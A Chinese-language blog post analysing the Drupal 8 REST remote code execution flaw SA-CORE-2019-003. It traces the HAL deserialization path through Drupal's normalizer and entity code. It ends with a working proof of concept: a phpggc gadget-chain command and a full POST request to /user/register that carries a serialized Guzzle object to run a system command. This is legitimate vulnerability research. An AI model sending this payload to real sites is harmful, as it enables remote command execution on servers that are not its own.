> 原文链接: https://www.anquanke.com//post/id/171706 


# SA-CORE-2019-003：Drupal 远程命令执行分析


                                阅读量   
                                **173733**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            





[![](https://p5.ssl.qhimg.com/t01540ef39901e98502.png)](https://p5.ssl.qhimg.com/t01540ef39901e98502.png)



## 0x00 环境配置

此处针对于版本

```
# git log
commit 74e8c2055b33cb8794a7b53dc79b5549ce824bb3 (HEAD, tag: 8.6.9)
```

好的环境也就漏洞分析的一大半

drupal 的 rest 功能有点僵硬

需满足的条件如下

[![](https://p403.ssl.qhimgs4.com/t0160e77745c3608684.png)](https://p403.ssl.qhimgs4.com/t0160e77745c3608684.png)

管理界面这两个都得安排上

但其实你会发现你安装了 drupal 你却没有 restui 这个东西

到这里下载 解压

[https://www.drupal.org/project/restui](https://www.drupal.org/project/restui)

[![](https://p403.ssl.qhimgs4.com/t01f06152f8acd3bd93.png)](https://p403.ssl.qhimgs4.com/t01f06152f8acd3bd93.png)

放置于此。 为什么呢，你看看这个 README.txt

[![](https://p403.ssl.qhimgs4.com/t01b8ff082718496b09.png)](https://p403.ssl.qhimgs4.com/t01b8ff082718496b09.png)

悟道

[![](https://p403.ssl.qhimgs4.com/t0108666d0b85f1a898.png)](https://p403.ssl.qhimgs4.com/t0108666d0b85f1a898.png)

[![](https://p403.ssl.qhimgs4.com/t0134e97fff3e5c6c7f.png)](https://p403.ssl.qhimgs4.com/t0134e97fff3e5c6c7f.png)

把这个 enable

还需要 设置允许匿名用户利用 POST 来访问 /user/register

[![](https://p403.ssl.qhimgs4.com/t01c35ae3aea98adae4.png)](https://p403.ssl.qhimgs4.com/t01c35ae3aea98adae4.png)

实际还得装上 hal 这个处理 json 的扩展

[![](https://p403.ssl.qhimgs4.com/t01159f1c67ce24f211.png)](https://p403.ssl.qhimgs4.com/t01159f1c67ce24f211.png)

至此环境配置结束 。。。 坑还是有点多

关于 PHP 调试我是以 Docker 为主体做的远程调试配置，如果对此感兴趣的话，将在下次做一些展开。

毕竟一个 `docker-compose up` 就能实现调试，还算能减少一些环境配置的过程



## 0x01 分析

本文将以两个角度共同对该漏洞的产生，drupal 的设计模式，drupal normalize/denormailze 的实现进行详尽的分析以及阐释

分析中的各个有意思的点以及关键位置如下目录所示

hal_json 的条件

getDenormalizer 解析

link types 的由来

$entity-&gt;get() 解析

type shortcut 解析流程

symfony interface 简单逻辑

### <a class="reference-link" name="%E7%AE%80%E5%8D%95%E6%B5%81%E7%A8%8B"></a>简单流程

[![](https://p403.ssl.qhimgs4.com/t01dfdea1c483eeff9a.png)](https://p403.ssl.qhimgs4.com/t01dfdea1c483eeff9a.png)

drupal 是基于 symfony 的框架的 web 框架，这框架接口等待以后进行补全

[![](https://p403.ssl.qhimgs4.com/t0172762bd3d747928e.png)](https://p403.ssl.qhimgs4.com/t0172762bd3d747928e.png)

这里截图一下 denormalize 的栈

根据 云鼎 RR 的分析

[![](https://p403.ssl.qhimgs4.com/t01da58262098b091eb.png)](https://p403.ssl.qhimgs4.com/t01da58262098b091eb.png)

注意 `Content-Type:application/hal+json` 字段 (未验证是否起决定作用)

这里的 _links-&gt;type-&gt;href 就会决定这里的 content_target 最后返回的类型

[![](https://p403.ssl.qhimgs4.com/t01b51a72e2798e0940.png)](https://p403.ssl.qhimgs4.com/t01b51a72e2798e0940.png)

接着往下走

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p403.ssl.qhimgs4.com/t01e48aa4dd99f1d5d3.png)

成功到了 git diff 能观测到的漏洞触发点

MapItem

[![](https://p403.ssl.qhimgs4.com/t01e10b28a286faa420.png)](https://p403.ssl.qhimgs4.com/t01e10b28a286faa420.png)

LinkItem

[![](https://p403.ssl.qhimgs4.com/t01dba03a30c0517fd4.png)](https://p403.ssl.qhimgs4.com/t01dba03a30c0517fd4.png)

### <a class="reference-link" name="%E5%85%A5%E5%8F%A3%E5%85%A5%E6%89%8B"></a>入口入手

> 从入口入手可以直观的看到整个框架的运行流程以及方便整理出流程关系甚至你可以获得设计模式

其实代码结构中的 core/rest/RequestHandler.php 这种命名格式的文件一般就是继承或者注册了路由的处理函数，肯定可以作为入手点进行观测

[![](https://p403.ssl.qhimgs4.com/t01729b7f9e85fe53ac.png)](https://p403.ssl.qhimgs4.com/t01729b7f9e85fe53ac.png)

其中进行了 deserialize 处理

[![](https://p403.ssl.qhimgs4.com/t01f9d297c4e4c0413f.png)](https://p403.ssl.qhimgs4.com/t01f9d297c4e4c0413f.png)

renew_getDenormalizer

而在阅读代码中，这是第一处 getDenormalizer 的调用

[![](https://p403.ssl.qhimgs4.com/t019f093b7b92516c29.png)](https://p403.ssl.qhimgs4.com/t019f093b7b92516c29.png)

$this-&gt;normalizers

[![](https://p403.ssl.qhimgs4.com/t013bfdeebb7ac0a1a5.png)](https://p403.ssl.qhimgs4.com/t013bfdeebb7ac0a1a5.png)

为什么 DrupalusersEntityUser 可以对应到 ContentEntityNormalizer 呢？

[![](https://p403.ssl.qhimgs4.com/t01c1b7061b074b021b.png)](https://p403.ssl.qhimgs4.com/t01c1b7061b074b021b.png)

这里因为有一层 User 继承 ContentEntityBase ， ContentEntityBase 实现了 ContentEntityInterface，而对应了 ContentEntityNormalizer

[![](https://p403.ssl.qhimgs4.com/t01e0ef4406b09701b0.png)](https://p403.ssl.qhimgs4.com/t01e0ef4406b09701b0.png)

hal_json 实际由来的情况

[![](https://p403.ssl.qhimgs4.com/t015fcf0b04b7d76557.png)](https://p403.ssl.qhimgs4.com/t015fcf0b04b7d76557.png)

hal_json_detail

这里就出现了狼人情况， 这总共 18 个 Normalizer 而且是在 开启 HAL 情况下才会有 `DrupalhalNormalizer*` 其他的 Normalizer $format 全为 null 无法继续处理 对于 /`DrupalhalNormalizer*` 来说 $format 只有 hal_json ，从这里定下

GET 参数 _format=hal_json

[![](https://p403.ssl.qhimgs4.com/t01757b72b1c4459fe9.png)](https://p403.ssl.qhimgs4.com/t01757b72b1c4459fe9.png)

所以在进行 in_array 判断成立 过了 checkFormat 的判断后

[![](https://p403.ssl.qhimgs4.com/t0152fefc53cb7d94db.png)](https://p403.ssl.qhimgs4.com/t0152fefc53cb7d94db.png)

[![](https://p403.ssl.qhimgs4.com/t01b30a847b92454656.png)](https://p403.ssl.qhimgs4.com/t01b30a847b92454656.png)

还进行了针对 DrupaluserEntityUser 的继承关系检测

[![](https://p403.ssl.qhimgs4.com/t01ed12dce9df95594d.png)](https://p403.ssl.qhimgs4.com/t01ed12dce9df95594d.png)

supportsDenormalization 针对 DrupaluserEntityUser 而找到了 ContentEntityNormalizer

第一阶段通过 路由 /user 决定 entity DrupaluserEntityUser 进行第一部分的 denormalize 而使用的就是 ContentEntityNormalizer-&gt;denormalize

进行第二阶段 ContentEntityNormalizer 反序列化根据 POST 中传递的 _link-&gt;type 来决定处理的 entity， 关于 entity 的处理可以向下继续阅读

继续调用 denormalizeFieldData 来实现进一步的处理

关于此处的 denormalizeFieldData

[![](https://p403.ssl.qhimgs4.com/t0169bc95b9b9af0f78.png)](https://p403.ssl.qhimgs4.com/t0169bc95b9b9af0f78.png)

因为使用了 Trait 这种 php 中的特性

[PHP: Traits – Manual](http://php.net/manual/en/language.oop5.traits.php)

[![](https://p403.ssl.qhimgs4.com/t01b4654a5cf622648d.png)](https://p403.ssl.qhimgs4.com/t01b4654a5cf622648d.png)

所以才到了 FieldableEntityNormalizerTrait 中进行具体的处理

所以调用 DrupalhalNormalizerContentEntityNormalizer 的 denormalizer 方法

[![](https://p403.ssl.qhimgs4.com/t01830c8214bef5f740.png)](https://p403.ssl.qhimgs4.com/t01830c8214bef5f740.png)

$data 是传入的 post content 被处理后的对象， 那么可以看到此处在通过获得 `POST-&gt;_links-&gt;type` 的值

[![](https://p403.ssl.qhimgs4.com/t014f2fc6dcb81c74b3.png)](https://p403.ssl.qhimgs4.com/t014f2fc6dcb81c74b3.png)

如果存在 `POST-&gt;_links-&gt;type-&gt;href` 字段那么就直接给 `$types` 赋值

[![](https://p403.ssl.qhimgs4.com/t0181e7bf8beb6e99bb.png)](https://p403.ssl.qhimgs4.com/t0181e7bf8beb6e99bb.png)

那么 getTypeInternalIds 就成为了要满足的条件

[![](https://p403.ssl.qhimgs4.com/t01c39ad4364c18fde5.png)](https://p403.ssl.qhimgs4.com/t01c39ad4364c18fde5.png)

[![](https://p403.ssl.qhimgs4.com/t01d9769e8fe2ea9131.png)](https://p403.ssl.qhimgs4.com/t01d9769e8fe2ea9131.png)

cache_data_types

[![](https://p403.ssl.qhimgs4.com/t0127e942211e94dae0.png)](https://p403.ssl.qhimgs4.com/t0127e942211e94dae0.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p403.ssl.qhimgs4.com/t01f416adf63cb0373f.png)

从 cache 中取 key 为 `hal:links:types` 的缓存 可以看到总共有 37 条缓存，这些缓存的对应关系都如下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p403.ssl.qhimgs4.com/t014dc43cf70288ea51.png)

可以看到只要传入这 37 条的任意一条均可通过验证

此处返回对象即为

[![](https://p403.ssl.qhimgs4.com/t014af7c8cbf0f96ed0.png)](https://p403.ssl.qhimgs4.com/t014af7c8cbf0f96ed0.png)

[![](https://p403.ssl.qhimgs4.com/t013bfaa9f2c7eb0e0b.png)](https://p403.ssl.qhimgs4.com/t013bfaa9f2c7eb0e0b.png)

[![](https://p403.ssl.qhimgs4.com/t01327e5feaa061d752.png)](https://p403.ssl.qhimgs4.com/t01327e5feaa061d752.png)

赋值 $value -&gt; value[shortcut_set]=’default’

[![](https://p403.ssl.qhimgs4.com/t014af0667e759875ea.png)](https://p403.ssl.qhimgs4.com/t014af0667e759875ea.png)

通过
- entity_type ‘shortcut’
- bundle ‘default’
获得出 `DrupalshortcutEntityShortcut` 对象 调用 create 传入上述 $value

[![](https://p403.ssl.qhimgs4.com/t0169ce774c6d5ed8d5.png)](https://p403.ssl.qhimgs4.com/t0169ce774c6d5ed8d5.png)

[![](https://p403.ssl.qhimgs4.com/t01c4979c2496acbcb6.png)](https://p403.ssl.qhimgs4.com/t01c4979c2496acbcb6.png)

[![](https://p403.ssl.qhimgs4.com/t013059a7968025159f.png)](https://p403.ssl.qhimgs4.com/t013059a7968025159f.png)

[![](https://p403.ssl.qhimgs4.com/t01d34bbb2cdb1ca2e6.png)](https://p403.ssl.qhimgs4.com/t01d34bbb2cdb1ca2e6.png)

EntityTypeManager-&gt;getDefinition

[![](https://p403.ssl.qhimgs4.com/t0142eaead4d08ec6af.png)](https://p403.ssl.qhimgs4.com/t0142eaead4d08ec6af.png)

DiscoveryCachedTrait-&gt;getDefinition

[![](https://p403.ssl.qhimgs4.com/t019ed0916dac3e2af1.png)](https://p403.ssl.qhimgs4.com/t019ed0916dac3e2af1.png)

[![](https://p403.ssl.qhimgs4.com/t019ab57297c49e44fa.png)](https://p403.ssl.qhimgs4.com/t019ab57297c49e44fa.png)

[![](https://p403.ssl.qhimgs4.com/t015166d83b6369f939.png)](https://p403.ssl.qhimgs4.com/t015166d83b6369f939.png)

`ContentEntityType` 是继承于 `EntityType` 的,所以在调用 `getHandlerClass` 的时候是使用 `EntityType` 中的方法

[![](https://p403.ssl.qhimgs4.com/t01e7ee99b39807270f.png)](https://p403.ssl.qhimgs4.com/t01e7ee99b39807270f.png)

在 post 数据初始化 `getStorage` 的过程中经过 handler 的有
- rest_resource_config
- user_role
- shortcut
而且进一步观察到 `$this-&gt;handlers[$handler_type][$entity_type]` 这个值在调用 `getHandler` 的时候如果没有被 set 那么就会通过如上过程完成初始化

然后对此处断点，去回顾一下在 drupal 运行流程中什么时候会触发 `EntityTypeManager` 的 `getHandler` 初始化并且初始化的值分别是什么

流程如下
- `$definition = $this-&gt;getDefinition($entity_type);`
- `$class = $definition-&gt;getHandlerClass($handler_type);`
- `$this-&gt;handlers[$handler_type][$entity_type] = $this-&gt;createHandlerInstance($class, $definition);`
[![](https://p403.ssl.qhimgs4.com/t011704ad592638cefd.png)](https://p403.ssl.qhimgs4.com/t011704ad592638cefd.png)

而实例生成的效果基本就是以 `$class` 然后传入 `$definition` 进行实例化

那么可以说是至关重要的点就是在于 `getDefinition($entity_type)` 此处的实现而此处的 `entity_type` 和上文传入的 `_links-&gt;type` 字段是有绑定关系的

[![](https://p403.ssl.qhimgs4.com/t01fe8a9980853609a3.png)](https://p403.ssl.qhimgs4.com/t01fe8a9980853609a3.png)

回到 create

[![](https://p403.ssl.qhimgs4.com/t0171a694e9d3e2ef87.png)](https://p403.ssl.qhimgs4.com/t0171a694e9d3e2ef87.png)

`SqlContentEntityStorage` 继承 `ContentEntityStorageBase`<br>
， `ContentEntityStorageBase` 继承 `EntityStorageBase`

EntityStorageBase 的构造函数

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p403.ssl.qhimgs4.com/t01c143488246e49d42.png)

调用节点是发生在 `createHandlerInstance` 的时候

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p403.ssl.qhimgs4.com/t012cd36dce78ede7ad.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p403.ssl.qhimgs4.com/t0162a9202e02f4b87b.png)

那么基本可以确定此处就是为什么限定 `_links-&gt;type` 字段的原因了，那么要确定 `$entity_type` 的值就得从漏洞触发的过滤出发了

skip_shortcut_entity_process

[![](https://p403.ssl.qhimgs4.com/t01b1c7fbd6f16e3a10.png)](https://p403.ssl.qhimgs4.com/t01b1c7fbd6f16e3a10.png)

而 `getStorage` 之后再通过 `create` 创建出对应的 `entity` 实体，进一步通过 `ContentEntityNormalizer` 的 `denormalizeFieldData` 进行处理 等效调用 `FieldableEntityNormalizerTrait` 中的 `denormalizeFieldData`

[![](https://p403.ssl.qhimgs4.com/t0133bfeea141d7f90f.png)](https://p403.ssl.qhimgs4.com/t0133bfeea141d7f90f.png)

而进一步产生关联的地方在于 `entity-&gt;get($field_name)`

而 `$field_name` 和 post 传入的 `$data` 息息相关并且是完全输入可控的部分

entity_get_detail

关于 `entity-&gt;get($field_name)` 的实现

[![](https://p403.ssl.qhimgs4.com/t01b48dd5603f94a18e.png)](https://p403.ssl.qhimgs4.com/t01b48dd5603f94a18e.png)

type_ShortCut

在 ShortCut 的情况下只有 `EntityReferenceFieldItemList`，`FieldItemList` 这两种情况。

那么非 ShortCut 的情况呢。

在展开的时候尝试使用

[![](https://p403.ssl.qhimgs4.com/t01209801ec374c0cf2.png)](https://p403.ssl.qhimgs4.com/t01209801ec374c0cf2.png)

但发现了 ContentEntityNormalizer-&gt;denormalizeFieldData 会直接抛出异常

[![](https://p403.ssl.qhimgs4.com/t01c31df953057670e7.png)](https://p403.ssl.qhimgs4.com/t01c31df953057670e7.png)

原因是因为

[![](https://p403.ssl.qhimgs4.com/t0123ce362c2204bc57.png)](https://p403.ssl.qhimgs4.com/t0123ce362c2204bc57.png)

这个 use 限定了 `denormalizeFieldData` 可以被传入的实例类型

必须为 `FieldableEntityInterface` 的实现

因为没有直接 implements 的，转而寻找子类

[![](https://p403.ssl.qhimgs4.com/t0146d8c54b1d34e45c.png)](https://p403.ssl.qhimgs4.com/t0146d8c54b1d34e45c.png)

实际有这一处

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p403.ssl.qhimgs4.com/t010039454de7220648.png)

```
interface ContentEntityInterface extends Traversable, FieldableEntityInterface, TranslatableRevisionableInterface

```

interface 类型的有
- ShortcutInterface
- MessageInterface
- ContentModerationStateInterface
- FileInterface
- CommentInterface
- ItemInterface
- FeedInterface
- UserInterface
- BlockContentInterface
- WorkspaceInterface
- MenuLinkContentInterface
- TermInterface
- NodeInterface
- MediaInterface
回到刚才的要求里，并结合[cache data 列表](#cache_data_types)

我验证的可用的有且仅有
- shortcut/default (成立)
- user/user (无 entity-&gt;get)
- comment/comment
- file/file
[shortcut/default 解析](#type_ShortCut)

了解完这些之后

那么此时就要开始根据最开始的 diff 结果开始进行情况过滤了。

因为 `denormalizeFieldData` 这个在 `DrupalserializationNormalizer` 中实现的方法应该是属于定义的接口函数，会根据不同是实例调用到对应实例的 `Normalizer` 的子 `denormalize` 处理函数。此处由函数名以及代码逻辑得知此处由 `field` 来决定

那么此处需要的 entity 是什么呢？ 从 diff 中看到受影响的是 `MapItem` `LinkItem` 这两个类，所以就得往上追溯是哪一个 entity 会调用到对应 Field。

### <a class="reference-link" name="Diff%20%E5%85%A5%E6%89%8B"></a>Diff 入手

从 diff 中看到受影响的是 `MapItem` `LinkItem` 这两个类，所以就得往上追溯是哪一个 entity 会调用到对应 Field。

那就拿 `LinkItem` 开刀

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p403.ssl.qhimgs4.com/t0124f9bd3a3ad3b687.png)

interface_logic

由于触发在 `setValue` 那么肯定是要去找对应的调用，而根据上文以及阅读的代码，drupal 封装自 symfony 而所有的方式基本都已用接口的方式实现，那么在这种设计模式下你是不可能直观的找到 `LinkItem-&gt;setValue` 这种简单的调用的。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p403.ssl.qhimgs4.com/t0118e1d37af551b182.png)

phpstorm 的 FindUsage 果然无法精确定位这种设计模式 ：（

那么此处就涉及到 drupal 的虚函数了，那么设计模式的东西真令人头大。

[![](https://p403.ssl.qhimgs4.com/t018baa04d31122ed59.png)](https://p403.ssl.qhimgs4.com/t018baa04d31122ed59.png)

LinkItem 实现了 `LinkItemInterface` 这个接口

[![](https://p403.ssl.qhimgs4.com/t0177249c779a533eb8.png)](https://p403.ssl.qhimgs4.com/t0177249c779a533eb8.png)

LinkItemInterface 继承于 FieldItemInterface

[![](https://p403.ssl.qhimgs4.com/t019e0f5f17b962dd7c.png)](https://p403.ssl.qhimgs4.com/t019e0f5f17b962dd7c.png)

可以在源码中找到针对 `FieldItemInterface` 实现序列化/反序列化的 `FieldItemNormalizer`

emm 其实这里的理由并不够太充分，但实际阅读源码，drupal 中还有大量的类似实现，那么就可以确定这就是 drupal 的设计模式: 基础类实现具体接口，而对应的父接口则有固定的反序列化/序列化的实现

[![](https://p403.ssl.qhimgs4.com/t0120d897e8dc115dae.png)](https://p403.ssl.qhimgs4.com/t0120d897e8dc115dae.png)

观测其反序列化实现中存在 setValue 的调用

[![](https://p403.ssl.qhimgs4.com/t01866a5ea191768823.png)](https://p403.ssl.qhimgs4.com/t01866a5ea191768823.png)

那么只需要再去找 `FieldItemNormalizer` 的 denormalize 调用即可

而在刚才阅读 `denormalizeFieldData` 的代码的时候就不难明白， drupal 中所有的序列化调用都是 symfony 的 `DenormalizerInterface` 的实现

前期情况回顾一下

[![](https://p403.ssl.qhimgs4.com/t01c833aa3807d80024.png)](https://p403.ssl.qhimgs4.com/t01c833aa3807d80024.png)

Symfony `Serializer-&gt;denormalize()` 根据 post /user<br>
最终导向了 `ContentEntityNormalizer-&gt;denormalizeFieldData()`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p403.ssl.qhimgs4.com/t015d3206c6c2ec9d56.png)

[![](https://p403.ssl.qhimgs4.com/t0123e21853aca71be8.png)](https://p403.ssl.qhimgs4.com/t0123e21853aca71be8.png)

此处的 entity 就是刚才分析的 getStorage=&gt;create 这个过程创建的 entity 实体，下面即有所需的 `denormalize` 调用。要调用到 `FieldItemNormalizer` 就需要满足

1）

`entity-&gt;get($field_name)` 需要返回一个使用 `DrupalCoreFieldFieldItemInterface` 的实例

2）

[![](https://p403.ssl.qhimgs4.com/t015b7381f47ac80d60.png)](https://p403.ssl.qhimgs4.com/t015b7381f47ac80d60.png)

此处 `getDenormalizer` 的检验上文已经说过 [点我回顾](#renew_getDenormalizer)

[![](https://p403.ssl.qhimgs4.com/t01c9607ef652ca5b7b.png)](https://p403.ssl.qhimgs4.com/t01c9607ef652ca5b7b.png)

实际也还是在这 18 个结果中找到对应的条件

[![](https://p403.ssl.qhimgs4.com/t015dae6200d8e8ac22.png)](https://p403.ssl.qhimgs4.com/t015dae6200d8e8ac22.png)

要获得 `FieldItemNormalizer` 就必须满足传入的数据是 `DrupalCoreFieldFieldItemInterface` 这个接口的实现或者是子类接口的实现

[![](https://p403.ssl.qhimgs4.com/t01d30b97ff4a90aeae.png)](https://p403.ssl.qhimgs4.com/t01d30b97ff4a90aeae.png)

这就是一个直接可以搜索到的子类接口

[![](https://p403.ssl.qhimgs4.com/t01e219de3502ae2d71.png)](https://p403.ssl.qhimgs4.com/t01e219de3502ae2d71.png)

而这就是是其对应的实现

从而问题就变成了 `$entity-&gt;get($field_name);` 如何才能返回

`FieldItemInterface` 那么问题就来了，根据

[shortcut/default 解析](#type_ShortCut)

[entity-&gt;get 解析](#entity_get_detail)

这里的分析，没有满足 FieldItemInterface 这个条件的情况。

有的是如下两种情况

`EntityReferenceFieldItemList`，`FieldItemList`

但是这里可以联想以及搜索一下 `FieldItemList` ，毕竟和所需的元素只有状态的差别 List-&gt;Item 这里从 pythoner 的角度不难觉得是可以联想的

那么就以 `FieldItemList` 向下推导

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p403.ssl.qhimgs4.com/t01b413100f35b6e669.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p403.ssl.qhimgs4.com/t011d6ba0e164a7e6fc.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p403.ssl.qhimgs4.com/t01726a48cebe7f6884.png)

FieldNormalizer-&gt;denormalize 果然和想象的一致，是可以从 List 中提取出单个元素再次进行 denormalize 处理

核心就在于 `$item_class = $items-&gt;getItemDefinition()-&gt;getClass();` 能获得 FieldItemInterface 的实现吗？

[![](https://p403.ssl.qhimgs4.com/t01ab032238b789f9a3.png)](https://p403.ssl.qhimgs4.com/t01ab032238b789f9a3.png)

[![](https://p403.ssl.qhimgs4.com/t01eb2207abe866539d.png)](https://p403.ssl.qhimgs4.com/t01eb2207abe866539d.png)

[![](https://p403.ssl.qhimgs4.com/t0132965c824b81c7bf.png)](https://p403.ssl.qhimgs4.com/t0132965c824b81c7bf.png)

[![](https://p403.ssl.qhimgs4.com/t01b3e18a3e1d98fef1.png)](https://p403.ssl.qhimgs4.com/t01b3e18a3e1d98fef1.png)

[![](https://p403.ssl.qhimgs4.com/t0111a6218140856c12.png)](https://p403.ssl.qhimgs4.com/t0111a6218140856c12.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p403.ssl.qhimgs4.com/t0115869b802221688d.png)

对应的 `$definitions` 是 `DiscoveryCachedTrait` 中保存的 `$definitions`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p403.ssl.qhimgs4.com/t01dd7a2ea03a725a18.png)

而在这之中恰好存在
<li>field_item:link
<ul>
- DrupallinkPluginFieldFieldTypeLinkItem- DrupalCoreFieldPluginFieldFieldTypeMapItem
那么至此漏洞以及 drupal 的流程也已叙述完毕



## 0x02 漏洞证明

如果使用/user/register接口的话，可以跳过正常的字段检测，那么需要一些必要字段来通过check，此次没有阅读源码直接猜想得出常见的用户注册字段。但是又会产生新的错误，不如不操作 : (

之后确认源码，针对输入信息的校验其实是发生在所有的denormalize之后的所以即使不传入相关信息也可以正常触发反序列化

利用 [phpggc](https://github.com/ambionics/phpggc)

```
phpggc guzzle/rce1 system id --json
```

如果使用`/user/register` 接口的话那么需要一些必要字段来通过`check`此次因为是REST接口所以可以，不阅读源码直接猜想得出

```
POST /drupal/user/register?_format=hal_json HTTP/1.1
Host: 127.0.0.1
Content-Type: application/hal+json
cache-control: no-cache
Postman-Token: 258f5d68-a142-4837-b76c-b15807e84bdb
`{`
"link": [`{`"options":"O:24:"GuzzleHttp\Psr7\FnStream":2:`{`s:33:"u0000GuzzleHttp\Psr7\FnStreamu0000methods";a:1:`{`s:5:"close";a:2:`{`i:0;O:23:"GuzzleHttp\HandlerStack":3:`{`s:32:"u0000GuzzleHttp\HandlerStacku0000handler";s:2:"id";s:30:"u0000GuzzleHttp\HandlerStacku0000stack";a:1:`{`i:0;a:1:`{`i:0;s:6:"system";`}``}`s:31:"u0000GuzzleHttp\HandlerStacku0000cached";b:0;`}`i:1;s:7:"resolve";`}``}`s:9:"_fn_close";a:2:`{`i:0;r:4;i:1;s:7:"resolve";`}``}`"`}`],
"title": ["bbb"],
"username": "213",
"password": "EqLp7rhVvsh3fhPPsJBP",
"email": "c1tas@c1tas.com",
"_links": `{`
"type": `{`"href": "http://127.0.0.1/drupal/rest/type/shortcut/default"`}`
`}`
`}`------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

[![](https://p403.ssl.qhimgs4.com/t0180ec95ed3d6bac02.png)](https://p403.ssl.qhimgs4.com/t0180ec95ed3d6bac02.png)



## 0x03 参考链接

[Drupal core – Highly critical – Remote Code Execution – SA-CORE-2019-003 | Drupal.org](https://www.drupal.org/sa-core-2019-003)

[Drupal SA-CORE-2019-003 远程命令执行分析-腾讯御见威胁情报中心](https://mp.weixin.qq.com/s/hvHkN1YdnvkgJBc2F1oqlQ)

[Exploiting Drupal8’s REST RCE](https://www.ambionics.io/blog/drupal8-rce)
